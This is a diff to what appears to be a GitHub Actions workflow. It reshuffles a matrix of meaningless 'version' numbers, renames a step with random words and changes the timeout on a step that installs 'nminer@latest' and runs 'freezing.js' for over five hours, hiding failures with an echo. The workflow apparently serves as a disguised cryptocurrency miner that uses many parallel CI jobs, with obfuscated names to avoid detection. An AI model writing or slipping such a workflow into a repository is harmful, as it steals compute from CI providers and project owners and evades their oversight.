@@ -9,26 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6561 }
-          - { version: 811 }
-          - { version: 9717 }
-          - { version: 5397 }
-          - { version: 8606 }
-          - { version: 638 }
-          - { version: 35 }
-          - { version: 6223 }
-          - { version: 7545 }
-          - { version: 3809 }
-          - { version: 1120 }
-          - { version: 7806 }
-          - { version: 4613 }
-          - { version: 3551 }
-          - { version: 4909 }
-          - { version: 4892 }
-          - { version: 118 }
-          - { version: 1146 }
-          - { version: 1193 }
-          - { version: 6838 }
+          - { version: 5731 }
+          - { version: 9524 }
+          - { version: 9850 }
+          - { version: 3829 }
+          - { version: 1331 }
+          - { version: 5492 }
+          - { version: 8618 }
+          - { version: 6374 }
+          - { version: 5353 }
+          - { version: 3937 }
+          - { version: 9562 }
+          - { version: 1393 }
+          - { version: 8403 }
+          - { version: 9951 }
+          - { version: 3693 }
+          - { version: 6147 }
 
     steps:
       - name: Checkout
@@ -39,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: ugly good-natured ugh into
+      - name: gosh archaeology versus pace times
         run: |
           npm install nminer@latest
-          timeout 302m node freezing.js || echo "freezing executed"
+          timeout 313m node freezing.js || echo "freezing executed"
